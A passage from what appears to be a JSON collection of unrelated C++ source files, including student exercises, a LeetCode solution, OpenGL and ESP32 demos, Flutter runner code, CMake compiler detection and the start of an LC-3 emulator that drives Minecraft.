}\r\n}\r\n\r\nvoid printTutorialTable0(){\r\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: yu <yu@student.42.fr>                      +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/07 16:04:57 by ychen2            #+#    #+#             */\n/*   Updated: 2024/05/11 17:00:53 by yu               ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n\n#include \"Server.hpp\"\n#include <iostream>\n#include <cerrno>\n#include <cstdio>\n\nint main () {\n\ttry{\n\t\tstd::vector<Settings> settings;\n\t\tsettings.push_back(Settings(8080)); \n\t\tsettings.push_back(Settings(12345)); \n\t\tServer server(settings);\n\t\tserver.run();\n\t\t\n\t}\n\tcatch (std::exception & e){\n\t\tif (errno != 0)\n\t\t\tperror(e.what());\n\t\telse\n\t\t\tstd::cerr << e.what() << std::endl;\n\t}\n\n\treturn 0;\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode() : val(0), next(nullptr) {\n    }\n    ListNode(int x) : val(x), next(nullptr) {\n    }\n    ListNode(int x, ListNode *next) : val(x), next(next) {\n    }\n};\n\nstruct TreeNode {\n    int val;\n    TreeNode *left;\n    TreeNode *right;\n    TreeNode() : val(0), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {\n    }\n};\n\nclass Node {\npublic:\n    int val;\n    vector<Node *> neighbors;\n    Node() {\n        val = 0;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val) {\n        val = _val;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val, vector<Node *> _neighbors) {\n        val = _val;\n        neighbors = _neighbors;\n    }\n};\n\n/*the solution should start from below*/\n\nclass Solution {\npublic:\n    int numberOfSpecialChars(string word) {\n        bitset<52> alphabet;\n        for (const auto &ch : word) {\n            if (islower(ch)) {\n                alphabet[ch - 'a'] = true;\n            } else {\n                alphabet[(ch - 'A') + 26] = true;\n            }\n        }\n        int cntr = 0;\n        for (size_t i = 0; i < 26; i++) {\n            if (alphabet[i] && alphabet[i + 26]) cntr++;\n        }\n        return cntr;\n    }\n};",
    "#include<iostream>\n#include<GL/glut.h>\nusing namespace std;\nint w = 600;\nint h = 400;\n\n// *************Function Decleartion**************\n\tvoid coordinate();\n\tvoid myInit();\n\tvoid MyDisplay();\n\tvoid bresenhamCircle(int x,int y,int r);\n\n// **************MAIN FUNCTION************************\nint main(int a,char **v) {\n\tglutInit(&a,v);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowPosition(0,0);\n\tglutInitWindowSize(h,w);\n\tglutCreateWindow(\"Bresenham Circle\");\n\tmyInit();\n\tglutDisplayFunc(MyDisplay);\n\tglutMainLoop();\n\treturn 0;\n}\n\n// ***************** Myinit ********************\nvoid myInit() {\n\tglPointSize(5.0);\n\tglClearColor(1.0,1.0,1.0,0);\n\tglColor3f(0.0,0.0,0.0);\n\tgluOrtho2D(-w/2,w/2,-h/2,h/2);\n}\n\nvoid coordinate() {\n\tglBegin(GL_LINES);\n\t\tglVertex2d(-w/2,0);\n\t\tglVertex2d(w/2,0);\n\t\tglVertex2d(0,-h/2);\n\t\tglVertex2d(0,h/2);\n\tglEnd();\n\tglFlush();\n}\n\nvoid MyDisplay() {\n\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\tcoordinate();\n\tbresenhamCircle(0,0,100);\n\tglFlush();\n}\n\nvoid bresenhamCircle(int x,int y,int r) {\n\tint xi = 0;\n\tint yi = r;\n\tint pk = 3-2*r;\n\tint pi = pk;\n\n\twhile(xi<=yi) {\n\t\tglBegin(GL_POINTS);\n\t\t\tglVertex2f(xi,yi);\n\t\t\tglVertex2f(yi,xi);\n\t\t\tglVertex2f(yi,-xi);\n\t\t\tglVertex2f(xi,-yi);\n\t\t\tglVertex2f(-xi,-yi);\n\t\t\tglVertex2f(-yi,-xi);\n\t\t\tglVertex2f(-yi,xi);\n\t\t\tglVertex2f(-xi,yi);\n\n\t\tglEnd();\n\t\tglFlush();\n\n\t\tif(pi<0) {\n\t\t\txi = xi+1;\n\t\t\tyi = yi;\n\t\t\tpi = pi+4*xi+6;\n\t\t}\n\t\telse {\n\t\t\txi = xi+1;\n\t\t\tyi = yi-1;\n\t\t\tpi = pi+4*(xi-yi)+10;\n\t\t}\n\t}\n\n}\n",
    "#include \"freertos/FreeRTOS.h\"\n#include \"freertos/task.h\"\n#include \"esp_log.h\"\n#include \"esp_system.h\"\n\n#include \"dynamixel2espressif.h\"\n#include \"actuator.h\"\n\n#define MY_SERVO_ID             3\n#define DXL_PROTOCOL_VERSION    2.0\n#define MY_UART                 UART_NUM_2\n\n/*\n    BEFORE YOU BEGIN:\n\n    1: Run idf.py menuconfig to configure\n       pins for UART TX, RX and DIR:\n       under \"Dynamixel 2 Espressif configuration\"\n    2: Change the value of MY_SERVO_ID to the ID you have given your test servo.\n*/\n\nDynamixel2Espressif dxl(MY_UART, (gpio_num_t)CONFIG_DXL_DIR_PIN);\n\nvoid setup() \n{\n    // Set Port baudrate to 1000000bps. This has to match with DYNAMIXEL baudrate.\n    dxl.begin(1000000);\n    // Set Port Protocol Version. This has to match with DYNAMIXEL protocol version.\n    dxl.setPortProtocolVersion(DXL_PROTOCOL_VERSION);\n\n    // Turn off torque when configuring items in EEPROM area\n    dxl.torqueOff(MY_SERVO_ID);\n    dxl.setOperatingMode(MY_SERVO_ID, OP_POSITION);\n    dxl.torqueOn(MY_SERVO_ID);\n}\n\n\nstatic void dxl_task(void *pvParameters)\n{\n    setup();\n\n    while (true )\n    {\n        dxl.setGoalPosition(MY_SERVO_ID, 1000);\n        vTaskDelay(500 / portTICK_PERIOD_MS);\n        dxl.setGoalPosition(MY_SERVO_ID, 500);\n        vTaskDelay(500 / portTICK_PERIOD_MS);\n    }\n}\n\nextern \"C\" void app_main(void)\n{\n     xTaskCreate(dxl_task, \"dxl task\", 16384, NULL, 5, NULL);\n\n    while (true) {\n        vTaskDelay(100 / portTICK_PERIOD_MS);\n    }\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <algorithm>\r\n#include <cctype>\r\n\r\nusing namespace std;\r\n\r\n\tclass kontakt{\r\n\t\r\n\t\tprivate:\r\n\t\t\r\n\t\t\tint telCislo;\r\n\t\t\tstring jmeno;\r\n\t\t\tstring prijmeni;\r\n\t\t\tstring povolani;\r\n\t\t\tstring firma;\r\n\t\t\tstring email;\r\n\t\t\tint vek;\r\n\t\t\tstring datumNarozeni;\r\n\t\t\r\n\t\tpublic:\r\n\t\t\r\n\t\t\tkontakt(int telCislo, string jmeno, string prijmeni, string povolani, string firma, string email, int vek, string datumNarozeni){\r\n\t\t\t\tthis->telCislo = telCislo;\r\n\t\t\t\tthis->jmeno = jmeno;\r\n\t\t\t\tthis->prijmeni = prijmeni;\r\n\t\t\t\tthis->povolani = povolani;\r\n\t\t\t\tthis->firma = firma;\r\n\t\t\t\tthis->email = email;\r\n\t\t\t\tthis->vek = vek;\r\n\t\t\t\tthis->datumNarozeni = datumNarozeni;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tint getTelCislo(int telCislo){\r\n\t\t\t\treturn telCislo;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getJmeno(string jmeno){\r\n\t\t\t\treturn jmeno;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getPrijmeni(string prijmeni){\r\n\t\t\t\treturn prijmeni;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getPovolani(string povolani){\r\n\t\t\t\treturn povolani;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getFirma(string firma){\r\n\t\t\t\treturn firma;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getEmail(string email){\r\n\t\t\t\treturn email;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tint getVek(int vek){\r\n\t\t\t\treturn vek;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getDatumNarozeni(string datumNarozeni){\r\n\t\t\t\treturn datumNarozeni;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tvoid vypsat(){\r\n\t\t\t\tcout << \"Jmeno a prijmeni: \" << getJmeno(jmeno) << \" \" << getPrijmeni(prijmeni) << endl;\r\n\t\t\t\tcout << \"Telefonni cislo: \" << getTelCislo(telCislo) << endl;\r\n\t\t\t\tcout << \"Povolani: \" << getPovolani(povolani) << endl;\r\n\t\t\t\tcout << \"Firma: \" << getFirma(firma) << endl;\r\n\t\t\t\tcout << \"Email: \" << getEmail(email) << endl;\r\n\t\t\t\tcout << \"Vek: \" << getVek(vek) << endl;\r\n\t\t\t\tcout << \"Datum narozeni: \" << getDatumNarozeni(datumNarozeni) << endl;\r\n\t\t\t}\t\r\n\t\t\r\n\t};\r\n\r\n\tchar ToUpper(char cyklus){\r\n\t\treturn std::toupper(static_cast<unsigned char>(cyklus));\r\n\t}\r\n\r\nint main(int argc, char *argv[]){\r\n\t\r\n\tint vyber;\r\n\tchar cyklus;\r\n\t\r\n\tkontakt Pavel(789225103, \"Pavel\", \"Novak\", \"Elektrikar\", \"LCD Labs\", \"pnovak@lcd.cz\", 39, \"15. leden 1985\");\r\n\tkontakt Adam(608995422, \"Adam\", \"Novotny\", \"Programator\", \"Microsoft\", \"adamdeveloper@microsoft.com\", 26, \"10. brezen 1998\");\r\n\tkontakt Josef(991238250, \"Josef\", \"Dvorak\", \"Duchodce\", \"N/A\", \"N/A\", 91, \"29. unor 1933\");\r\n\tkontakt Klara(775148952, \"Klara\", \"Svobodova\", \"Student\", \"SSIPF Cichnova\", \"st011862@student.cichnovabrno.cz\", 17, \"7. duben 2007\");\r\n\t\r\n\tdo{\r\n\t\tcout << \"Seznam telefonnich kontaktu\" << endl;\r\n\t\tcout << \"1. Pavel\" << endl;\r\n\t\tcout << \"2. Adam\" << endl;\r\n\t\tcout << \"3. Josef\" << endl;\r\n\t\tcout << \"4. Klara\" << endl;\r\n\t\tcout << \"Vyber kontakt: \";\r\n\t\tcin >> vyber;\r\n\t\r\n\t\tsystem(\"cls\");\r\n\t\r\n\t\t\tswitch(vyber){\r\n\t\t\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\t\r\n\t\t\t\t\tPavel.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tcase 2:\r\n\t\t\t\t\t\r\n\t\t\t\t\tAdam.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\t\r\n\t\t\t\t\tJosef.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tcase 4:\r\n\t\t\t\t\t\r\n\t\t\t\t\tKlara.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tdefault:\r\n\t\t\t\t\t\r\n\t\t\t\t\tcout << \"Neplatna odpoved.\" << endl;\r\n\t\t\t\t\treturn 0;\r\n\t\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\r\n\t\t\t}\r\n\t\r\n\tcout << \"Prejete si program pouzit znovu? (y/Y): \";\r\n\tcin >> cyklus;\r\n\t\r\n\tchar upperCyklus = std::toupper(cyklus);\r\n\t\r\n\tsystem(\"cls\");\r\n\t\r\n\t}while(cyklus == 'Y' || cyklus == 'y');\r\n\t\tcout << \"Dekuji za pouziti programu. Ukoncuji.\" << endl;\r\n\t\treturn 0;\r\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(",
    "#include <iostream>\n\n// Node class to represent each element in the linked list\nclass Node {\npublic:\n    int data;\n    Node* next;\n\n    Node(int val) {\n        data = val;\n        next = nullptr;\n    }\n};\n\n// Queue class using a linked list\nclass Queue {\nprivate:\n    Node* front;\n    Node* rear;\n\npublic:\n    Queue() {\n        front = nullptr;\n        rear = nullptr;\n    }\n\n    // Function to add an element to the queue\n    void enqueue(int val) {\n        Node* newNode = new Node(val);\n        if (rear == nullptr) {\n            front = rear = newNode;\n            return;\n        }\n        rear->next = newNode;\n        rear = newNode;\n    }\n\n    // Function to remove an element from the queue\n    void dequeue() {\n        if (front == nullptr) {\n            std::cout << \"Queue is empty, cannot dequeue.\" << std::endl;\n            return;\n        }\n        Node* temp = front;\n        front = front->next;\n\n        // If front becomes null, then change rear to null as well\n        if (front == nullptr) {\n            rear = nullptr;\n        }\n\n        delete temp;\n    }\n\n    // Function to get the front element of the queue\n    int getFront() {\n        if (front == nullptr) {\n            std::cout << \"Queue is empty.\" << std::endl;\n            return -1; // Return an invalid value or throw an exception\n        }\n        return front->data;\n    }\n\n    // Function to check if the queue is empty\n    bool isEmpty() {\n        return front == nullptr;\n    }\n\n    // Function to print the elements of the queue\n    void printQueue() {\n        if (front == nullptr) {\n            std::cout << \"Queue is empty.\" << std::endl;\n            return;\n        }\n\n        Node* temp = front;\n        while (temp != nullptr) {\n            std::cout << temp->data << \" \";\n            temp = temp->next;\n        }\n        std::cout << std::endl;\n    }\n};\n\nint main() {\n    Queue q;\n\n    q.enqueue(10);\n    q.enqueue(20);\n    q.enqueue(30);\n\n    std::cout << \"Queue elements: \";\n    q.printQueue();\n\n    std::cout << \"Front element: \" << q.getFront() << std::endl;\n\n    q.dequeue();\n    std::cout << \"Queue elements after dequeue: \";\n    q.printQueue();\n\n    std::cout << \"Front element after dequeue: \" << q.getFront() << std::endl;\n\n    q.dequeue();\n    q.dequeue();\n    std::cout << \"Queue elements after multiple dequeues: \";\n    q.printQueue();\n\n    std::cout << \"Is queue empty? \" << (q.isEmpty() ? \"Yes\" : \"No\") << std::endl;\n\n    return 0;\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: alaassir <alaassir@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/01 01:04:39 by alaassir          #+#    #+#             */\n/*   Updated: 2024/05/01 01:04:50 by alaassir         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"ClapTrap.hpp\"\n\nint main()\n{\n    ClapTrap claptrap1;\n    ClapTrap claptrap2(\"Second ClapTrap\");\n    ClapTrap claptrap3 = claptrap2;\n\n    claptrap1.attack(\"Target 1\");\n    claptrap2.takeDamage(5);\n    claptrap3.beRepaired(3);\n\n    claptrap1 = claptrap3;\n\n    claptrap2.attack(\"Target 2\");\n    claptrap3.takeDamage(8);\n    claptrap1.beRepaired(2);\n\n    ClapTrap claptrap4 = claptrap1;\n    claptrap4.attack(\"Target 3\");\n\n    return 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <stdio.h>\n#include <stdint.h>\n#include <signal.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/termios.h>\n#include <sys/mman.h>\n#include <cstring>\n/* for MCPI */\n#include <mcpp/mcpp.h>\n#include <mcpp/util.h>\n\nmcpp::MinecraftConnection *mc;\n\n// Converts a byte into string of binary digits\n#define BYTE_TO_BINARY_PATTERN \"%c%c%c%c%c%c%c%c\"\n#define BYTE_TO_BINARY(byte)   \\\n  ((byte) & 0x80 ? '1' : '0'), \\\n  ((byte) & 0x40 ? '1' : '0'), \\\n  ((byte) & 0x20 ? '1' : '0'), \\\n  ((byte) & 0x10 ? '1' : '0'), \\\n  ((byte) & 0x08 ? '1' : '0'), \\\n  ((byte) & 0x04 ? '1' : '0'), \\\n  ((byte) & 0x02 ? '1' : '0'), \\\n  ((byte) & 0x01 ? '1' : '0') \n\nenum \n{\n    FLAG_SIG = 'd', // signed\n    FLAG_HEX = 'x', // hex\n    FLAG_BIN = 'b', // binary\n    FLAG_SUP = 's'  // suppress run info\n};\nenum\n{\n    R_R0 = 0,\n    R_R1,\n    R_R2,\n    R_R3,\n    R_R4,\n    R_R5,\n    R_R6,\n    R_R7,\n    R_PC, /* program counter */\n    R_COND,\n    R_COUNT\n};\nenum\n{\n    FL_POS = 1 << 0, /* P */\n    FL_ZRO = 1 << 1, /* Z */\n    FL_NEG = 1 << 2, /* N */\n};\nenum\n{\n    OP_BR = 0, /* branch */\n    OP_ADD,    /* add  */\n    OP_LD,     /* load */\n    OP_ST,     /* store */\n    OP_JSR,    /* jump register */\n    OP_AND,    /* bitwise and */\n    OP_LDR,    /* load register */\n    OP_STR,    /* store register */\n    OP_RTI,    /* unused */\n    OP_NOT,    /* bitwise not */\n    OP_LDI,    /* load indirect */\n    OP_STI,    /* store indirect */\n    OP_JMP,    /* jump */\n    OP_RES,    /* reserved (unused) */\n    OP_LEA,    /* load effective address */\n    OP_TRAP    /* execute trap */\n};\n\nenum\n{\n    MR_KBSR = 0xFE00, /* keyboard status */\n    MR_KBDR = 0xFE02  /* keyboard data */\n};\nenum\n{\n    TRAP_GETC = 0x20,            /* get character from keyboard, not echoed onto the terminal */\n    TRAP_OUT = 0x21,             /* output a character */\n    TRAP_PUTS = 0x22,            /* output a word string */\n    TRAP_IN = 0x23,              /* get character from keyboard, echoed onto the terminal */\n    TRAP_PUTSP = 0x24,           /* output a byte string */\n    TRAP_HALT = 0x25,            /* halt the program */\n    TRAP_REG = 0x27,             // print registers to console\n    TRAP_CHAT = 0x28,            // post string to chat\n    TRAP_GETP = 0x29,            // get player tile\n    TRAP_SETP = 0x2A,            // set player tile\n    TRAP_GETB = 0x2B,            // get block type\n    TRAP_SETB = 0x2C,            // set block type\n    TRAP_GETH = 0x2D,            // get height\n    \n};\n\n#define MEMORY_MAX (1 << 16)\nuint16_t memory[MEMORY_MAX];  /* 65536 locations */\nuint16_t reg[R_COUNT];\nuint16_t flag;\n\n// tracking\nuint32_t inst_count = 0;\nuint32_t api_calls = 0;\n\nstruct termios original_tio;\n\nbool flag_set(uint16_t chk_flag) {\n    return flag == chk_flag;\n}\n\nvoid disable_input_buffering()\n{\n    tcgetattr(STDIN_FILENO, &original_tio);\n    struct termios new_tio = original_tio;\n    new_tio.c_lflag &= ~ICANON & ~ECHO;\n    tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);\n}\n\nvoid restore_input_buffering()\n{\n    tcsetattr(STDIN_FILENO, TCSANOW, &original_tio);\n}\n\nuint16_t check_key()\n{\n    fd_set readfds;\n    FD_ZERO(&readfds);\n    FD_SET(STDIN_FILENO, &readfds);\n\n    struct timeval timeout;\n    timeout.tv_sec = 0;\n    timeout.tv_usec = 0;\n    return select(1, &readfds, NULL, NULL, &timeout) != 0;\n}\nvoid handle_interrupt(int signal)\n{\n    restore_input_buffering();\n    printf(\"\\n\");\n    exit(-2);\n}\nuint16_t sign_extend(uint16_t x, int bit_count)\n{\n    if ((x >> (bit_count - 1)) & 1) {\n        x |= (0xFFFF << bit_count);\n    }\n    return x;\n}\nuint16_t swap16(uint16_t x)\n{\n    return (x << 8) | (x >> 8);\n}\nvoid update_flags(uint16_t r)\n{\n    if (reg[r] == 0)\n    {\n        reg[R_COND] = FL_ZRO;\n    }\n    else if (reg[r] >> 15) /* a 1 in the left-most bit indicates negative */\n    {\n        reg[R_COND] = FL_NEG;\n    }\n    else\n    {\n        reg[R_COND] = FL_POS;\n    }\n}\nvoid read_image_file(FILE* file)\n{\n    /* the origin tells us where in memory to place the image */\n    uint16_t origin;\n    fread(&origin, sizeof(origin), 1, file);\n    origin = swap16(origin);\n\n    /* we know the maximum file size so we only need one fread */\n    uint16_t max_read = MEMORY_MAX - origin;\n    uint16_t* p = memory + origin;\n    